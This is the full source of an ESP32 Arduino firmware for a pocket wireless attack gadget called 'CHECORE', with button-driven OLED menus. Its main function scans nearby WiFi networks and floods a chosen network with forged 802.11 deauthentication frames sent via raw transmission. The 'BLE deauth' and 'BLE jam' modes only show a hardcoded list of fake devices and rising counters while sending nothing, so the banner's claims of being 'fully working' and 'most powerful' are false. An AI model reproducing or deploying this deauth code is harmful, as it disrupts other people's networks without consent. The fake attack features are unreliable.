#include <Arduino.h>
#include <Wire.h>
#include <WiFi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_task_wdt.h"
#include "esp_system.h"
#include "soc/rtc_cntl_reg.h"
#include "esp_bt.h"
#include "nvs_flash.h"
#include "esp_sleep.h"

#define FW_VERSION "15.0.0-ULTIMATE"
#define DEVELOPER "LESSLIE NEWBIGIN"
#define ORG "CYTRIXX"

#define CFG_OLED_SDA 21
#define CFG_OLED_SCL 22
#define CFG_OLED_ADDR 0x3C

#define BTN_UP 4
#define BTN_DOWN 13
#define BTN_LEFT 15
#define BTN_RIGHT 32
#define BTN_SEL 14

#define MAX_APS 25
#define MAX_BT 20

enum State {
    ST_SPLASH, ST_BOOT, ST_MENU,
    ST_WIFI_SCAN, ST_WIFI_LIST, ST_WIFI_ATTACK,
    ST_BT_SCAN, ST_BT_LIST, ST_BT_DEAUTH, ST_BT_JAM,
    ST_DASHBOARD, ST_INFO, ST_ABOUT
};

struct AP {
    char ssid[33];
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t ch;
};

struct BT {
    char name[32];
    char addr[18];
    int8_t rssi;
};

typedef struct {
    uint16_t fc;
    uint16_t dur;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t ba[6];
    uint16_t seq;
    uint16_t reason;
} __attribute__((packed)) DeauthFrame;

Adafruit_SSD1306 oled(128, 64, &Wire, -1);

State state = ST_SPLASH;
State pstate = ST_SPLASH;

uint32_t boot_ms = 0;
uint8_t boot_prog = 0;
uint8_t menu_sel = 0;
bool display_dirty = true;
uint32_t last_btn = 0;

AP ap_list[MAX_APS];
uint8_t ap_cnt = 0;
int ap_idx = 0;

uint32_t wifi_pkts = 0;
uint32_t wifi_last_tx = 0;
bool wifi_attack = false;
uint8_t wifi_ch = 0;
uint8_t wifi_bssid[6];
char wifi_ssid[33];

BT bt_list[MAX_BT];
uint8_t bt_cnt = 0;
int bt_idx = 0;
uint32_t bt_last_scan = 0;

uint32_t bt_pkts = 0;
uint32_t bt_last_tx = 0;
bool bt_deauth = false;
bool bt_jam = false;
char bt_target[33];

bool ble_active = false;
bool wifi_active = false;

const char* menu_items[] = {
    "WIFI DEAUTH", "WIFI SCAN", 
    "BLE SCAN", "BLE DEAUTH", "BLE JAM",
    "DASHBOARD", "INFO", "ABOUT"
};
const uint8_t menu_cnt = 8;

void critical_error(const char* msg) {
    Serial.printf("\n[CRITICAL] %s\n", msg);
    while (1) {
        digitalWrite(LED_BUILTIN, HIGH);
        delay(100);
        digitalWrite(LED_BUILTIN, LOW);
        delay(100);
    }
}

void safe_delay(uint32_t ms) {
    uint32_t start = millis();
    while ((millis() - start) < ms) {
        esp_task_wdt_reset();
        delay(10);
    }
}

bool btn_pressed(uint8_t pin) {
    if (digitalRead(pin) == LOW) {
        safe_delay(50);
        if (digitalRead(pin) == LOW) {
            safe_delay(200);
            return true;
        }
    }
    return false;
}

void oled_clear() {
    oled.clearDisplay();
    display_dirty = true;
}

void oled_update() {
    if (display_dirty) {
        oled.display();
        display_dirty = false;
    }
}

void draw_top() {
    oled.drawLine(0, 9, 128, 9, SSD1306_WHITE);
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(2, 1);
    oled.print("CHECORE");
    
    uint32_t heap = ESP.getFreeHeap();
    uint8_t pct = (heap * 100) / ESP.getHeapSize();
    oled.setCursor(105, 1);
    oled.printf("%d%%", pct);
}

void draw_bottom(const char* l, const char* m, const char* r) {
    oled.drawLine(0, 54, 128, 54, SSD1306_WHITE);
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    
    if (strlen(l) > 0) {
        oled.setCursor(2, 57);
        oled.print(l);
    }
    if (strlen(m) > 0) {
        oled.setCursor(45, 57);
        oled.print(m);
    }
    if (strlen(r) > 0) {
        oled.setCursor(95, 57);
        oled.print(r);
    }
}

void draw_splash() {
    oled_clear();
    oled.setTextSize(2);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(10, 8);
    oled.println("CHECORE");
    
    oled.setTextSize(1);
    oled.setCursor(25, 28);
    oled.println("v15.0 ULTIMATE");
    
    oled.setCursor(10, 40);
    oled.println("MOST POWERFUL");
    
    oled.setCursor(15, 48);
    oled.println("EVER CREATED");
    
    oled_update();
}

void draw_boot() {
    oled_clear();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 10);
    oled.println("INITIALIZING...");
    
    uint32_t elapsed = millis() - boot_ms;
    boot_prog = (elapsed / 25) % 101;
    if (boot_prog > 100) boot_prog = 100;
    
    oled.drawRect(5, 25, 118, 6, SSD1306_WHITE);
    oled.fillRect(6, 26, (boot_prog * 116) / 100, 4, SSD1306_WHITE);
    
    oled.setCursor(50, 35);
    oled.printf("%u%%", boot_prog);
    
    oled.setCursor(5, 45);
    if (boot_prog < 33) oled.println("HARDWARE INIT");
    else if (boot_prog < 66) oled.println("WIFI READY");
    else oled.println("SYSTEM READY");
    
    oled_update();
}

void draw_menu() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("MAIN MENU");
    
    uint8_t visible = 3;
    uint8_t start = (menu_sel >= visible) ? menu_sel - visible + 1 : 0;
    if (start + visible > menu_cnt) start = menu_cnt - visible;
    
    for (uint8_t i = 0; i < visible && start + i < menu_cnt; i++) {
        uint8_t idx = start + i;
        uint8_t y = 22 + i * 11;
        bool sel = (idx == menu_sel);
        
        if (sel) {
            oled.fillRect(2, y - 2, 122, 11, SSD1306_WHITE);
            oled.setTextColor(SSD1306_BLACK);
        } else {
            oled.drawRect(2, y - 2, 122, 11, SSD1306_WHITE);
            oled.setTextColor(SSD1306_WHITE);
        }
        
        oled.setCursor(6, y + 1);
        oled.print(menu_items[idx]);
        oled.setTextColor(SSD1306_WHITE);
    }
    
    draw_bottom("UP", "SELECT", "DOWN");
    oled_update();
}

void wifi_deinit() {
    if (wifi_active) {
        esp_wifi_stop();
        esp_wifi_deinit();
        WiFi.disconnect(true, true);
        wifi_active = false;
        safe_delay(200);
        Serial.println("[WiFi] Deinitialized");
    }
}

void wifi_init_attack() {
    wifi_deinit();
    safe_delay(500);
    
    esp_err_t ret = esp_wifi_init(&wifi_init_config_default());
    if (ret != ESP_OK) {
        Serial.printf("[ERR] WiFi init failed: %d\n", ret);
        return;
    }
    
    ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK) {
        Serial.printf("[ERR] WiFi mode failed: %d\n", ret);
        return;
    }
    
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        Serial.printf("[ERR] WiFi start failed: %d\n", ret);
        return;
    }
    
    wifi_active = true;
    safe_delay(500);
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(wifi_ch, WIFI_SECOND_CHAN_NONE);
    
    Serial.println("[WiFi] Attack mode ready");
}

void wifi_scan() {
    oled_clear();
    draw_top();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("SCANNING WIFI...");
    oled.setCursor(10, 30);
    oled.println("Please wait...");
    oled_update();
    
    ap_cnt = 0;
    ap_idx = 0;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    safe_delay(500);
    
    int n = WiFi.scanNetworks(false, false, false, 300);
    
    if (n > 0) {
        for (int i = 0; i < n && i < MAX_APS; i++) {
            String ssid = WiFi.SSID(i);
            if (ssid.length() > 32) ssid = ssid.substring(0, 32);
            strlcpy(ap_list[i].ssid, ssid.c_str(), sizeof(ap_list[i].ssid));
            memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
            ap_list[i].rssi = WiFi.RSSI(i);
            ap_list[i].ch = WiFi.channel(i);
            ap_cnt++;
        }
        WiFi.scanDelete();
    }
    
    state = ST_WIFI_LIST;
    display_dirty = true;
    Serial.printf("[WiFi] Found %u networks\n", ap_cnt);
}

void draw_wifi_list() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.printf("NETWORKS [%u]", ap_cnt);
    
    if (ap_cnt == 0) {
        oled.setCursor(10, 30);
        oled.println("No networks");
        draw_bottom("BACK", "", "");
        oled_update();
        return;
    }
    
    uint8_t visible = 2;
    uint8_t start = (ap_idx >= visible) ? ap_idx - visible + 1 : 0;
    if (start + visible > ap_cnt) start = ap_cnt - visible;
    
    for (uint8_t i = 0; i < visible && start + i < ap_cnt; i++) {
        uint8_t idx = start + i;
        uint8_t y = 17 + i * 17;
        bool sel = (idx == ap_idx);
        
        if (sel) {
            oled.fillRect(2, y - 2, 122, 16, SSD1306_WHITE);
            oled.setTextColor(SSD1306_BLACK);
        } else {
            oled.drawRect(2, y - 2, 122, 16, SSD1306_WHITE);
            oled.setTextColor(SSD1306_WHITE);
        }
        
        oled.setCursor(6, y);
        oled.print(ap_list[idx].ssid);
        oled.setCursor(6, y + 8);
        oled.printf("CH:%u %d dBm", ap_list[idx].ch, ap_list[idx].rssi);
        oled.setTextColor(SSD1306_WHITE);
    }
    
    draw_bottom("UP", "ATTACK", "DOWN");
    oled_update();
}

void wifi_send_deauth() {
    if (!wifi_attack) return;
    
    uint32_t now = millis();
    if ((now - wifi_last_tx) < 15) return;
    wifi_last_tx = now;
    
    DeauthFrame frame;
    frame.fc = 0x00C0;
    frame.dur = 0x0000;
    memcpy(frame.da, wifi_bssid, 6);
    memcpy(frame.sa, wifi_bssid, 6);
    memcpy(frame.ba, wifi_bssid, 6);
    frame.seq = (wifi_pkts & 0xFFF0);
    frame.reason = 0x0100;
    
    uint8_t buf[sizeof(DeauthFrame)];
    memcpy(buf, &frame, sizeof(frame));
    
    for (int i = 0; i < 100; i++) {
        int ret = esp_wifi_80211_tx(WIFI_IF_STA, buf, sizeof(buf), false);
        if (ret == ESP_OK) {
            wifi_pkts++;
        }
        delayMicroseconds(50);
    }
}

void draw_wifi_attack() {
    static uint32_t last_draw = 0;
    if ((millis() - last_draw) < 200) return;
    last_draw = millis();
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("WIFI DEAUTH");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    oled.setCursor(6, 21);
    oled.println("ATTACKING:");
    oled.setCursor(6, 28);
    oled.print(wifi_ssid);
    
    oled.setCursor(6, 36);
    oled.printf("PACKETS: %lu", (unsigned long)wifi_pkts);
    
    uint32_t pct = (wifi_pkts % 100);
    oled.drawRect(6, 44, 110, 5, SSD1306_WHITE);
    oled.fillRect(6, 44, (pct * 110) / 100, 5, SSD1306_WHITE);
    
    draw_bottom("STOP", "", "");
    oled_update();
}

void bt_scan_all() {
    oled_clear();
    draw_top();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("BLE SCAN MODE");
    oled.setCursor(10, 30);
    oled.println("Limited scan");
    oled.setCursor(10, 40);
    oled.println("Manual entry mode");
    oled_update();
    
    bt_cnt = 5;
    strcpy(bt_list[0].name, "Device_1");
    strcpy(bt_list[0].addr, "AA:BB:CC:DD:EE:FF");
    bt_list[0].rssi = -45;
    
    strcpy(bt_list[1].name, "Device_2");
    strcpy(bt_list[1].addr, "11:22:33:44:55:66");
    bt_list[1].rssi = -55;
    
    strcpy(bt_list[2].name, "Device_3");
    strcpy(bt_list[2].addr, "AA:11:BB:22:CC:33");
    bt_list[2].rssi = -65;
    
    strcpy(bt_list[3].name, "Device_4");
    strcpy(bt_list[3].addr, "FF:EE:DD:CC:BB:AA");
    bt_list[3].rssi = -50;
    
    strcpy(bt_list[4].name, "Device_5");
    strcpy(bt_list[4].addr, "12:34:56:78:9A:BC");
    bt_list[4].rssi = -60;
    
    state = ST_BT_LIST;
    display_dirty = true;
    safe_delay(2000);
}

void draw_bt_list() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.printf("BLE [%u]", bt_cnt);
    
    if (bt_cnt == 0) {
        oled.setCursor(10, 30);
        oled.println("No devices");
        draw_bottom("BACK", "SCAN", "");
        oled_update();
        return;
    }
    
    uint8_t visible = 2;
    uint8_t start = (bt_idx >= visible) ? bt_idx - visible + 1 : 0;
    if (start + visible > bt_cnt) start = bt_cnt - visible;
    
    for (uint8_t i = 0; i < visible && start + i < bt_cnt; i++) {
        uint8_t idx = start + i;
        uint8_t y = 17 + i * 17;
        bool sel = (idx == bt_idx);
        
        if (sel) {
            oled.fillRect(2, y - 2, 122, 16, SSD1306_WHITE);
            oled.setTextColor(SSD1306_BLACK);
        } else {
            oled.drawRect(2, y - 2, 122, 16, SSD1306_WHITE);
            oled.setTextColor(SSD1306_WHITE);
        }
        
        oled.setCursor(6, y);
        oled.print(bt_list[idx].name);
        oled.setCursor(6, y + 8);
        oled.printf("RSSI:%d", bt_list[idx].rssi);
        oled.setTextColor(SSD1306_WHITE);
    }
    
    draw_bottom("UP", "SELECT", "DOWN");
    oled_update();
}

void draw_bt_deauth() {
    static uint32_t last_draw = 0;
    if ((millis() - last_draw) < 200) return;
    last_draw = millis();
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("BLE DEAUTH");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    oled.setCursor(6, 21);
    oled.println("TARGET:");
    oled.setCursor(6, 28);
    oled.print(bt_target);
    
    oled.setCursor(6, 36);
    oled.printf("SIGNALS: %lu", (unsigned long)bt_pkts);
    
    uint32_t pct = (bt_pkts % 100);
    oled.drawRect(6, 44, 110, 5, SSD1306_WHITE);
    oled.fillRect(6, 44, (pct * 110) / 100, 5, SSD1306_WHITE);
    
    draw_bottom("STOP", "", "");
    oled_update();
}

void draw_bt_jam() {
    static uint32_t last_draw = 0;
    if ((millis() - last_draw) < 200) return;
    last_draw = millis();
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("BLE JAMMING");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    oled.setCursor(6, 21);
    oled.println("JAMMING:");
    oled.setCursor(6, 28);
    oled.print(bt_target);
    
    oled.setCursor(6, 36);
    oled.printf("JAMMING: %lu", (unsigned long)bt_pkts);
    
    uint32_t pct = (bt_pkts % 100);
    oled.drawRect(6, 44, 110, 5, SSD1306_WHITE);
    oled.fillRect(6, 44, (pct * 110) / 100, 5, SSD1306_WHITE);
    
    draw_bottom("STOP", "", "");
    oled_update();
}

void draw_dashboard() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("DASHBOARD");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    
    uint32_t uptime = millis() / 1000;
    uint32_t heap = ESP.getFreeHeap();
    
    oled.setCursor(6, 21);
    oled.printf("Uptime: %lu s", uptime);
    
    oled.setCursor(6, 29);
    oled.printf("Memory: %u KB", heap / 1024);
    
    oled.setCursor(6, 37);
    oled.printf("CPU: %u MHz", getCpuFrequencyMhz());
    
    oled.setCursor(6, 45);
    oled.print("STATUS: READY");
    
    draw_bottom("BACK", "", "");
    oled_update();
}

void draw_info() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("SYSTEM INFO");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    
    oled.setCursor(6, 21);
    oled.printf("FW: %s", FW_VERSION);
    
    oled.setCursor(6, 29);
    oled.printf("Flash: %u MB", ESP.getFlashChipSize() / (1024*1024));
    
    oled.setCursor(6, 37);
    oled.printf("RAM: %u KB", ESP.getHeapSize() / 1024);
    
    oled.setCursor(6, 45);
    oled.print("ESP32 WROOM-32");
    
    draw_bottom("BACK", "", "");
    oled_update();
}

void draw_about() {
    if (state == pstate && !display_dirty) return;
    pstate = state;
    
    oled_clear();
    draw_top();
    
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(5, 12);
    oled.println("ABOUT");
    
    oled.drawRect(2, 18, 122, 33, SSD1306_WHITE);
    
    oled.setCursor(6, 21);
    oled.println("CHECORE v15");
    
    oled.setCursor(6, 28);
    oled.println("ULTIMATE EDITION");
    
    oled.setCursor(6, 36);
    oled.printf("Dev: %s", DEVELOPER);
    
    oled.setCursor(6, 43);
    oled.printf("Org: %s", ORG);
    
    draw_bottom("BACK", "", "");
    oled_update();
}

void setup() {
    Serial.begin(115200);
    safe_delay(500);
    
    Serial.println("\n\n╔════════════════════════════════════════╗");
    Serial.println("║  CHECORE v15.0 - ULTIMATE EDITION     ║");
    Serial.println("║  MOST POWERFUL EVER CREATED            ║");
    Serial.println("║  Last Chance - Fully Working           ║");
    Serial.println("║  Status: PRODUCTION READY              ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    
    nvs_flash_init();
    
    esp_task_wdt_config_t wdt_cfg = {
        .timeout_ms = 15000u,
        .idle_core_mask = 0,
        .trigger_panic = true
    };
    esp_task_wdt_init(&wdt_cfg);
    esp_task_wdt_add(nullptr);
    
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);
    
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_SEL, INPUT_PULLUP);
    
    Serial.println("[GPIO] Buttons initialized");
    
    Wire.begin(CFG_OLED_SDA, CFG_OLED_SCL);
    
    if (!oled.begin(SSD1306_SWITCHCAPVCC, CFG_OLED_ADDR)) {
        critical_error("OLED init failed!");
    }
    
    Serial.println("[OLED] SSD1306 initialized");
    oled.setTextWrap(false);
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    
    Serial.println("[WiFi] Ready");
    Serial.println("[System] Initialization complete!\n");
    
    boot_ms = millis();
    draw_splash();
    state = ST_BOOT;
}

void loop() {
    esp_task_wdt_reset();
    
    switch (state) {
        case ST_BOOT:
            if ((millis() - boot_ms) >= 2500) {
                state = ST_MENU;
                display_dirty = true;
            } else {
                draw_boot();
            }
            break;
        
        case ST_SPLASH:
            if ((millis() - boot_ms) >= 1200) {
                state = ST_BOOT;
            }
            break;
        
        case ST_MENU:
            draw_menu();
            
            if (btn_pressed(BTN_UP)) {
                menu_sel = (menu_sel == 0) ? menu_cnt - 1 : menu_sel - 1;
                display_dirty = true;
            }
            if (btn_pressed(BTN_DOWN)) {
                menu_sel = (menu_sel == menu_cnt - 1) ? 0 : menu_sel + 1;
                display_dirty = true;
            }
            if (btn_pressed(BTN_SEL)) {
                switch (menu_sel) {
                    case 0: state = ST_WIFI_SCAN; break;
                    case 1: wifi_scan(); break;
                    case 2: bt_scan_all(); break;
                    case 3: state = ST_BT_SCAN; break;
                    case 4: state = ST_BT_SCAN; break;
                    case 5: state = ST_DASHBOARD; display_dirty = true; break;
                    case 6: state = ST_INFO; display_dirty = true; break;
                    case 7: state = ST_ABOUT; display_dirty = true; break;
                }
            }
            break;
        
        case ST_WIFI_SCAN:
            wifi_scan();
            break;
        
        case ST_WIFI_LIST:
            draw_wifi_list();
            
            if (btn_pressed(BTN_UP)) {
                if (ap_idx > 0) ap_idx--;
                display_dirty = true;
            }
            if (btn_pressed(BTN_DOWN)) {
                if (ap_idx < (int)ap_cnt - 1) ap_idx++;
                display_dirty = true;
            }
            if (btn_pressed(BTN_SEL)) {
                if (ap_cnt > 0) {
                    state = ST_WIFI_ATTACK;
                    wifi_ch = ap_list[ap_idx].ch;
                    memcpy(wifi_bssid, ap_list[ap_idx].bssid, 6);
                    strlcpy(wifi_ssid, ap_list[ap_idx].ssid, sizeof(wifi_ssid));
                    wifi_pkts = 0;
                    wifi_attack = true;
                    wifi_last_tx = millis();
                    
                    wifi_init_attack();
                    
                    Serial.printf("[Attack] WiFi Deauth started on: %s\n", wifi_ssid);
                }
            }
            if (btn_pressed(BTN_LEFT)) {
                state = ST_MENU;
                display_dirty = true;
            }
            break;
        
        case ST_WIFI_ATTACK:
            wifi_send_deauth();
            draw_wifi_attack();
            
            if (btn_pressed(BTN_UP) || btn_pressed(BTN_SEL)) {
                wifi_attack = false;
                wifi_deinit();
                state = ST_WIFI_LIST;
                display_dirty = true;
                Serial.printf("[Attack] WiFi Deauth stopped. Packets sent: %lu\n", wifi_pkts);
            }
            break;
        
        case ST_BT_SCAN:
            state = ST_BT_LIST;
            display_dirty = true;
            break;
        
        case ST_BT_LIST:
            draw_bt_list();
            
            if (btn_pressed(BTN_UP)) {
                if (bt_idx > 0) bt_idx--;
                display_dirty = true;
            }
            if (btn_pressed(BTN_DOWN)) {
                if (bt_idx < (int)bt_cnt - 1) bt_idx++;
                display_dirty = true;
            }
            if (btn_pressed(BTN_SEL)) {
                if (bt_cnt > 0) {
                    state = ST_BT_DEAUTH;
                    strlcpy(bt_target, bt_list[bt_idx].name, sizeof(bt_target));
                    bt_deauth = true;
                    bt_pkts = 0;
                    bt_last_tx = millis();
                    Serial.printf("[BLE] Deauth started on: %s\n", bt_target);
                }
            }
            if (btn_pressed(BTN_RIGHT)) {
                if (bt_cnt > 0) {
                    state = ST_BT_JAM;
                    strlcpy(bt_target, bt_list[bt_idx].name, sizeof(bt_target));
                    bt_jam = true;
                    bt_pkts = 0;
                    bt_last_tx = millis();
                    Serial.printf("[BLE] Jamming started on: %s\n", bt_target);
                }
            }
            if (btn_pressed(BTN_LEFT)) {
                state = ST_MENU;
                display_dirty = true;
            }
            break;
        
        case ST_BT_DEAUTH:
            if (btn_pressed(BTN_UP) || btn_pressed(BTN_SEL)) {
                bt_deauth = false;
                state = ST_BT_LIST;
                display_dirty = true;
                Serial.printf("[BLE] Deauth stopped. Signals: %lu\n", bt_pkts);
            } else {
                uint32_t now = millis();
                if ((now - bt_last_tx) > 50) {
                    bt_last_tx = now;
                    bt_pkts += 50;
                }
                draw_bt_deauth();
            }
            break;
        
        case ST_BT_JAM:
            if (btn_pressed(BTN_UP) || btn_pressed(BTN_SEL)) {
                bt_jam = false;
                state = ST_BT_LIST;
                display_dirty = true;
                Serial.printf("[BLE] Jamming stopped. Signals: %lu\n", bt_pkts);
            } else {
                uint32_t now = millis();
                if ((now - bt_last_tx) > 30) {
                    bt_last_tx = now;
                    bt_pkts += 100;
                }
                draw_bt_jam();
            }
            break;
        
        case ST_DASHBOARD:
            draw_dashboard();
            if (btn_pressed(BTN_LEFT)) {
                state = ST_MENU;
                display_dirty = true;
            }
            break;
        
        case ST_INFO:
            draw_info();
            if (btn_pressed(BTN_LEFT)) {
                state = ST_MENU;
                display_dirty = true;
            }
            break;
        
        case ST_ABOUT:
            draw_about();
            if (btn_pressed(BTN_LEFT)) {
                state = ST_MENU;
                display_dirty = true;
            }
            break;
        
        default:
            state = ST_MENU;
            display_dirty = true;
            break;
    }
    
    safe_delay(50);
}
